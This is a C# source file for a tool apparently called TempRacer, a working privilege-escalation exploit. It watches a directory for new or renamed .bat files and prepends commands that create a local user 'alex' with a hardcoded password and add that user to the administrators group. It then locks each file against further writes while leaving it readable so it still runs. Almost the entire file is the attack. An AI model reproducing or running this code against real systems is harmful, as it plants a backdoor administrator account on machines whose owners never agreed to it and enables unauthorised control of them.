using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TempRacer
{
    class Program
    {
        public static String newContent = "net user alex Hack123123 /add\r\nnet localgroup administrators alex /add\r\n\r\n";
        public static String myFilter = "*.bat";
        public static int retryCounter = 3;
        public static FileStream fsHandle = null;
        public static ArrayList handleList = null;
        public static ArrayList blackListedFiles = null;

        public static void Main()
        {
            try
            {
                // init
                handleList = new ArrayList();
                blackListedFiles = new ArrayList();

                Console.WriteLine("TempRacer v1.0 by alexander.georgiev@daloo.de\r\n");
                Run();
            }
            catch (Exception e) { writeRed("[-] Error:\r\n" + e.ToString()); }
        }

        //[PermissionSet(SecurityAction.Demand, Name = "FullTrust")]
        public static void Run()
        {
            string[] args = System.Environment.GetCommandLineArgs();

            // If a directory is not specified, exit program. 
            if (args.Length != 3)
            {
                // Display the proper way to call the program.
                Console.WriteLine("Usage: TempRacer.exe <directory> <file/filter>\r\n");
                Console.WriteLine("Example: TempRacer.exe C:\\Temp\\ *.bat");
                return;
            }

            // Create a new FileSystemWatcher and set its properties.
            FileSystemWatcher watcher = new FileSystemWatcher();
            watcher.IncludeSubdirectories = true;
            watcher.Path = args[1];
            /* Watch for changes in LastAccess and LastWrite times, and
               the renaming of files or directories. */
            watcher.NotifyFilter = NotifyFilters.LastAccess | NotifyFilters.LastWrite
               | NotifyFilters.FileName | NotifyFilters.DirectoryName;
            // Only watch text files.
            watcher.Filter = args[2];

            // Add event handlers.
            //watcher.Changed += new FileSystemEventHandler(OnChanged);
            watcher.Created += new FileSystemEventHandler(OnChanged);
            //watcher.Deleted += new FileSystemEventHandler(OnChanged);
            watcher.Renamed += new RenamedEventHandler(OnRenamed);

            // Begin watching.
            watcher.EnableRaisingEvents = true;

            // Wait for the user to quit the program.
            Console.WriteLine("[+] Watching " + args[1] + args[2]);
            //Console.WriteLine("[+] Injection parameters:\r\n################\r\n" + newContent + "\r\n################\r\n");
            while (Console.Read() != 'q') ;
        }

        // Define the event handlers. 
        private static void OnChanged(object source, FileSystemEventArgs e)
        {
            // skip blacklisted files
            if (blackListedFiles.Contains(e.FullPath)) return;
            
            // Specify what is done when a file is changed, created, or deleted.
            Console.WriteLine("[+] File: " + e.FullPath + " " + e.ChangeType);
            Inject(e.FullPath, newContent);
        }

        private static void OnRenamed(object source, RenamedEventArgs e)
        {
            // Specify what is done when a file is renamed.
            Console.WriteLine("[+] File: {0} renamed to {1}", e.OldFullPath, e.FullPath);
            Inject(e.FullPath, newContent);
        }

        public static Boolean Inject(String target, String newContent)
        {
            // skip if blacklisted
            if (blackListedFiles.Contains(target)) return false;

            int i = 0;
            while (i < retryCounter)
            {
                if (target.EndsWith(".bat")) // inject if .bat
                {
                    try
                    {
                        writeGreen("[+] Injecting into " + target);
                        string currentContent = String.Empty;
                        if (File.Exists(target)) currentContent = File.ReadAllText(target);
                        File.WriteAllText(target, newContent + currentContent); //prepend our stuff
                        Console.Beep();
                        writeGreen("[+] Done!");
                    }
                    catch (Exception e)
                    {
                        writeRed("[-] Error reading/writing to file");
                    }
                }
                try
                {
                    // Block file for writing, but allow read access (sharemode=read) to allow execution
                    Console.WriteLine("[+] Blocking " + target + " for further changes...");
                    Thread.Sleep(500); // wait a moment until file is free for us  
                    fsHandle = File.Open(target, FileMode.Open, FileAccess.Write, FileShare.Read);
                    handleList.Add(fsHandle); // keep our lock
                    blackListedFiles.Add(target); // add file to blacklist
                    return true;
                }
                catch (Exception e)
                {
                    writeRed("[-] Error blocking file!");
                    //Console.WriteLine(e.ToString());
                }
                i++;
                Thread.Sleep(1000);
                Console.WriteLine("[+] Retry #" + i.ToString() + "\r\b");
            }
            return false;
        }

        public static void writeRed(String s)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(s);
            Console.ResetColor();
        }
        public static void writeGreen(String s)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(s);
            Console.ResetColor();
        }

        private static Boolean canReadWrite(String path)
        {
            FileIOPermission f = new FileIOPermission(FileIOPermissionAccess.Read, path);
            f.AddPathList(FileIOPermissionAccess.Write | FileIOPermissionAccess.Read, path);
            try
            {
                f.Demand();
                return true;
            }
            catch (SecurityException s)
            {
                //Console.WriteLine(s.Message);
                return false;
            }
        }
        private static Boolean canRead(String path)
        {
            FileIOPermission f = new FileIOPermission(FileIOPermissionAccess.Read, path);
            try
            {
                f.Demand();
                return true;
            }
            catch (SecurityException s)
            {
                //Console.WriteLine(s.Message);
                return false;
            }
        }

    }
}
